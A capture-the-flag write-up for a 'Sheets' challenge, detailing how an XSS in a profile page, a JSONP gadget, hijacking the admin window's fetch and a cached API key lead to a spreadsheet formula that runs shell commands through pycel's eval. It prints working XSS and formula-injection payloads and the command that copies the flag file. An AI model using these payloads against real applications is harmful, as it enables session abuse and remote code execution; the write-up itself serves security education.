# Sheets

> Spreadsheet app (Svelte + FastAPI) with a Playwright admin bot and pycel formula evaluation. An XSS in the profile page reaches the admin's cached API key and a formula gives RCE.
> **Flag:** `flag{0fa434b39119b755}`

---

## Solution

### 1. Where the flag lives

`run.sh` writes the flag to a random name under `/app`:

```bash
echo $FLAG > /app/flag$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' ').txt
```

`utils.py` generates `admin_session_id` randomly and `api_write_key` as
`base32(secrets.token_bytes(32))`.

### 2. The authorization model

In `api.py`:

- `sessions[admin_session_id] = SessionData(username="admin", role="admin")`
- `/api/key` requires an admin session and returns `api_write_key`
- `POST /api/sheets` requires **any valid session** plus a valid `X-API-Key`

That last point is the flaw: writing sheets does not require admin, only the key.

### 3. The admin bot

`bot.py` opens Chromium and sets the admin cookie only for
`http://127.0.0.1:5000/`:

```text
token=<admin_session_id>
```

Then it visits the URL submitted to `/report`.

### 4. XSS in the profile page

`ProfileSettingsPage.svelte` renders HTML with a single-character filter:

```svelte
{@html `<textarea disabled rows="5">${
  appState.whoami
    ? JSON.stringify(appState.whoami, undefined, 2).replace("<", "")
    : "Loading..."
}</textarea>`}
```

Only the first `<` is removed, so `<<` breaks out of the textarea.
`/api/whoami/jsonp` works as a same-origin script gadget:

```html
<</textarea><iframe srcdoc='<script src=/api/whoami/jsonp?callback=PAYLOAD></script>'></iframe>
```

The catch: the malicious username can only be saved in a guest session, because
`POST /api/whoami` blocks `role == "admin"`.

### 5. Steal the key without exfiltrating it

The key never leaves the browser. The payload:

1. Opens `adminwin` at `http://127.0.0.1:5000/#/sheets` so the admin frontend
   fetches and caches `appState.key`.
2. Opens `guestwin`, navigates to `/api/logout` to drop the admin cookie, then
   creates a guest session with the XSS username and visits `/#/settings`.
3. The guest XSS grabs `open('', 'adminwin')` and monkeypatches its `fetch`.
4. When the admin window sends `POST /api/sheets`, the patch injects a formula.
5. The payload clicks the admin's "Save Changes" button.

The cross-site `POST /api/whoami` uses `enctype=text/plain` to produce valid JSON:

```text
name  = {"new_username":"<payload>","x":"
value = "}
body  = {"new_username":"<payload>","x":"="}
```

### 6. Formula to RCE

`pycel` evaluates formulas after the XLSX is saved and reopened:

```text
=eval("__import__('os').system('cat /app/flag* > /app/src/frontend/dist/pwn.txt')")
```

### 7. Read the flag

```bash
$ curl -s https://ab85b2f6e9b2eb80.chal.ctf.ae/pwn.txt
flag{0fa434b39119b755}
```

### 8. Flag

```text
flag{0fa434b39119b755}
```

## Lesson

Three small mistakes combine into full compromise: an HTML sanitizer that removes
one character, a privileged key cached in the frontend, and a write endpoint that
does not require the admin role. Formula engines that call `eval` turn a
spreadsheet into a shell.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
